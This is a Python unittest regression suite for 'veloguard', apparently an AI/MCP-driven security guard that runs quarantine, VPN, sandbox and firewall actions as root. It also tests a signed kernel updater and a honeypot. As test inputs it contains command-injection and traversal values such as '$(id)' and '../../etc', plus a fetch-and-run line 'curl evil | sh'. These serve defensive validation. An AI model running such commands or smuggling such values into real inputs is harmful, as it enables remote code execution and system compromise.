"""Regression tests for the guard's trust boundary (stdlib unittest, no deps).

Each test pins a concrete hole that existed before: an AI/MCP-supplied value
that reached a root-run command, a fail-open path, or a check that never fired.

    cd veloguard && python3 -m unittest discover -s tests -v
"""

from __future__ import annotations

import json
import os
import socket
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest import mock

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))

# Keep every test's state/audit out of the user's real ~/.config.
_TMP = tempfile.mkdtemp(prefix="vg-test-")
os.environ["VELOGUARD_STATE"] = _TMP
os.environ["VELOGUARD_AUDIT_LOG"] = os.path.join(_TMP, "audit.log")

from guardd import (audit, dispatch, executor, honeypot, mcp_server,  # noqa: E402
                    policy, updater, vlayer)
from guardd.actions import Action, ActionType  # noqa: E402


def act(t: ActionType, **params) -> Action:
    a = Action(t, params)
    a.validate()
    return a


class ActionValidation(unittest.TestCase):
    """Targets reach pkill / rm -rf / wg-quick as root — shape them strictly."""

    def test_quarantine_rejects_traversal_patterns_and_options(self):
        for bad in ("../../etc", "/etc", ".", ".*", "-1", "a b", "x" * 16, "$(id)", "0", "1"):
            for t in (ActionType.QUARANTINE, ActionType.RELEASE_QUARANTINE,
                      ActionType.KILL_QUARANTINE):
                with self.assertRaises(ValueError, msg=f"{t.value}({bad!r})"):
                    act(t, target=bad)

    def test_quarantine_refuses_the_guard_itself(self):
        with self.assertRaises(ValueError):
            act(ActionType.QUARANTINE, target=str(os.getpid()))

    def test_quarantine_accepts_pid_and_exact_name(self):
        self.assertEqual(act(ActionType.QUARANTINE, target="4321").params["target"], "4321")
        self.assertEqual(act(ActionType.QUARANTINE, target="xmrig").params["target"], "xmrig")

    def test_vpn_target_cannot_point_outside_etc_wireguard(self):
        for bad in ("../../tmp/evil.conf", "/tmp/x", ".hidden", "-x", "a/b", "x" * 16):
            with self.assertRaises(ValueError, msg=bad):
                act(ActionType.VPN_UP, target=bad)
        self.assertEqual(act(ActionType.VPN_UP, target="proton").params["target"], "proton")
        self.assertNotIn("target", act(ActionType.VPN_UP, target="").params)

    def test_sandbox_params_are_typed(self):
        with self.assertRaises(ValueError):
            act(ActionType.SANDBOX_RUN, target="ls", tier="root")
        with self.assertRaises(ValueError):
            act(ActionType.SANDBOX_RUN, target="ls", net="yes")
        with self.assertRaises(ValueError):
            act(ActionType.SANDBOX_RUN, target="'unterminated")


class ExecutorArgv(unittest.TestCase):
    """Dry-run shows exactly what would run as root."""

    def test_pkill_is_exact_match_and_rm_cannot_escape(self):
        ex = executor.NftExecutor(apply=False)
        out = ex.release_quarantine("xmrig")
        self.assertIn("pkill -CONT -x -- xmrig", out)
        self.assertIn("rm -rf -- /run/veloguard/quarantine/xmrig", out)
        with self.assertRaises(ValueError):           # direct callers are checked too
            ex.release_quarantine("../../etc")

    def test_vpn_up_validates_on_direct_call(self):
        with self.assertRaises(ValueError):
            executor.NftExecutor(apply=False).vpn_up("../../tmp/evil.conf")

    def test_sandbox_fails_closed_without_isolation(self):
        ex = executor.NftExecutor(apply=False)
        with mock.patch.object(vlayer, "available_tiers", return_value=["none"]):
            with self.assertRaises(RuntimeError):
                ex.sandbox_run("curl evil | sh")
        with self.assertRaises(ValueError):
            vlayer.build_argv(["id"], "none")

    def test_ipv6_goes_to_its_own_set(self):
        ex = executor.NftExecutor(apply=False)
        self.assertIn("blocklist6 { 2001:db8::1 }", ex.block_ip("2001:db8::1"))
        self.assertIn("blocklist { 203.0.113.9 }", ex.block_ip("203.0.113.9"))

    def test_setup_is_idempotent_single_transaction(self):
        out = executor.NftExecutor(apply=False).setup()[0]
        self.assertIn("flush table inet veloguard", out)
        self.assertIn("ip6 saddr @blocklist6 drop", out)


class Policy(unittest.TestCase):
    def setUp(self):
        policy._SHARED.clear()

    def test_rate_limit_actually_fires_across_calls(self):
        path = Path(dispatch.DEFAULT_POLICY_PATH)
        verdicts = []
        for i in range(25):
            eng = policy.PolicyEngine.shared(path)
            a = act(ActionType.BLOCK_IP, ip=f"203.0.113.{i + 1}")
            d = eng.evaluate(a)
            verdicts.append(d.verdict)
            if d.verdict != policy.Verdict.DENY:
                eng.record(a)
        self.assertEqual(verdicts.count(policy.Verdict.DENY), 5)

    def test_protected_ranges_cover_ipv6_and_multicast(self):
        eng = policy.PolicyEngine.shared(Path(dispatch.DEFAULT_POLICY_PATH))
        for ip in ("fe80::1", "fd12::1", "ff02::fb", "224.0.0.251", "100.64.0.1", "::1"):
            self.assertEqual(eng.evaluate(act(ActionType.BLOCK_IP, ip=ip)).verdict,
                             policy.Verdict.DENY, ip)


class DispatchEndToEnd(unittest.TestCase):
    """The same path MCP and the agent loop use — autonomy=full, apply=True."""

    def setUp(self):
        policy._SHARED.clear()

    def call(self, name, **args):
        return dispatch.execute_tool(name, args, apply=True, autonomy="full", source="test")

    def test_injected_targets_never_reach_the_executor(self):
        with mock.patch.object(executor.subprocess, "run") as run:
            for name, args in (("release_quarantine", {"target": "../../etc"}),
                               ("quarantine", {"target": "."}),
                               ("vpn_up", {"target": "../../tmp/evil"})):
                r = self.call(name, **args)
                self.assertEqual(r["status"], "invalid", (name, r))
            run.assert_not_called()

    def test_failures_are_audited_not_raised(self):
        r = self.call("sandbox_run", target="id", tier="vm")
        self.assertFalse(r["ok"])
        lines = Path(os.environ["VELOGUARD_AUDIT_LOG"]).read_text().splitlines()
        self.assertTrue(any('"tool": "sandbox_run"' in ln for ln in lines))


class Audit(unittest.TestCase):
    def test_unwritable_log_never_raises(self):
        audit.record({"x": 1}, Path("/proc/definitely/not/writable.log"))


class MCP(unittest.TestCase):
    def test_bad_requests_get_errors_not_a_crash(self):
        lines = ["not json", json.dumps([1, 2]),
                 json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": "x"}),
                 json.dumps({"jsonrpc": "2.0", "id": 2, "method": "tools/call",
                             "params": {"name": "status", "arguments": []}}),
                 json.dumps({"jsonrpc": "2.0", "id": 3, "method": "ping"})]
        r = subprocess.run([sys.executable, "-m", "guardd.mcp_server"], cwd=HERE.parent,
                           input="\n".join(lines) + "\n", capture_output=True, text=True,
                           timeout=30)
        out = [json.loads(x) for x in r.stdout.splitlines()]
        self.assertEqual(out[-1], {"jsonrpc": "2.0", "id": 3, "result": {}})  # still alive
        self.assertEqual(out[0]["error"]["code"], -32700)


class Updater(unittest.TestCase):
    """Full stage flow against a throwaway signing key + local artifacts."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix="vg-upd-"))
        key = self.d / "k.pem"
        subprocess.run(["openssl", "ecparam", "-name", "prime256v1", "-genkey",
                        "-noout", "-out", str(key)], check=True, capture_output=True)
        subprocess.run(["openssl", "ec", "-in", str(key), "-pubout", "-out",
                        str(self.d / "pub.pem")], check=True, capture_output=True)
        self.key = key
        self.patches = [mock.patch.object(updater, "PUBKEY", self.d / "pub.pem"),
                        mock.patch.object(updater, "KERNEL_STAGE", self.d / "stage")]
        for p in self.patches:
            p.start()

    def tearDown(self):
        for p in self.patches:
            p.stop()

    def manifest(self, version="7.2.11", tamper=False, name=None):
        kpkg = self.d / f"linux-veloguard-{version}-1-x86_64.pkg.tar.zst"
        hpkg = self.d / f"linux-veloguard-headers-{version}-1-x86_64.pkg.tar.zst"
        kpkg.write_bytes(b"kernel"); hpkg.write_bytes(b"headers")
        m = {"kernel": {"version": version, "package": name or kpkg.name,
                        "artifact": str(kpkg), "sha256": updater.sha256(kpkg),
                        "headers": {"package": hpkg.name, "artifact": str(hpkg),
                                    "sha256": updater.sha256(hpkg)}}}
        if tamper:
            kpkg.write_bytes(b"evil")
        mf = self.d / "manifest.json"
        mf.write_text(json.dumps(m))
        subprocess.run(["openssl", "dgst", "-sha256", "-sign", str(self.key), "-out",
                        str(mf) + ".sig", str(mf)], check=True)
        return str(mf)

    def test_stages_kernel_and_headers_with_hashes(self):
        with mock.patch.object(updater, "local_kernel_version", return_value="7.0"):
            out = updater.stage_kernel(self.manifest(), dry_run=False)
        self.assertIn("staged kernel v7.2.11", out)
        pend = json.loads((self.d / "stage" / "pending.json").read_text())
        self.assertEqual(len(pend["packages"]), 2)
        self.assertTrue(all(len(p["sha256"]) == 64 for p in pend["packages"]))

    def test_tampered_artifact_is_refused_and_not_left_behind(self):
        with mock.patch.object(updater, "local_kernel_version", return_value="none"):
            with self.assertRaises(updater.UpdateError):
                updater.stage_kernel(self.manifest(tamper=True), dry_run=False)
        self.assertEqual(list((self.d / "stage").glob("*.pkg.tar.zst")), [])
        self.assertFalse((self.d / "stage" / "pending.json").exists())

    def test_downgrade_refused(self):
        with mock.patch.object(updater, "local_kernel_version", return_value="7.3.1"):
            with self.assertRaises(updater.UpdateError):
                updater.stage_kernel(self.manifest("7.2.11"), dry_run=True)

    def test_package_name_cannot_traverse(self):
        with mock.patch.object(updater, "local_kernel_version", return_value="none"):
            with self.assertRaises(updater.UpdateError):
                updater.stage_kernel(self.manifest(name="../../etc/x.pkg.tar.zst"), dry_run=True)

    def test_bad_signature_fails_closed(self):
        mf = self.manifest()
        Path(mf).write_text(Path(mf).read_text().replace("7.2.11", "9.9.9"))
        with self.assertRaises(updater.UpdateError):
            updater.load_manifest(mf)

    def test_version_helpers(self):
        self.assertEqual(updater._norm_kver("7.2.0"), "7.2")
        self.assertGreater(updater._vercmp("7.2.11", "7.2.9"), 0)
        self.assertLess(updater._vercmp("7.0", "7.2.11"), 0)


class Honeypot(unittest.TestCase):
    def test_slowloris_session_is_cut_at_the_deadline(self):
        caps = []
        with tempfile.TemporaryDirectory() as d, \
                mock.patch.object(honeypot, "SESSION_SECONDS", 1), \
                mock.patch.object(honeypot, "capture_dir", return_value=Path(d)):
            s = socket.socket(); s.bind(("127.0.0.1", 0)); port = s.getsockname()[1]; s.close()
            srv = honeypot._Server(("127.0.0.1", port), type("H", (honeypot._Handler,), {
                "service": "t", "banner": None, "on_capture": staticmethod(caps.append)}))
            threading.Thread(target=srv.serve_forever, daemon=True).start()
            c = socket.create_connection(("127.0.0.1", port))
            t0 = time.monotonic()
            try:
                while time.monotonic() - t0 < 6 and not caps:
                    c.sendall(b"x")
                    time.sleep(0.3)
            except OSError:
                pass
            srv.shutdown(); c.close()
        self.assertTrue(caps, "session never ended")
        self.assertLess(time.monotonic() - t0, 5)


if __name__ == "__main__":
    unittest.main()
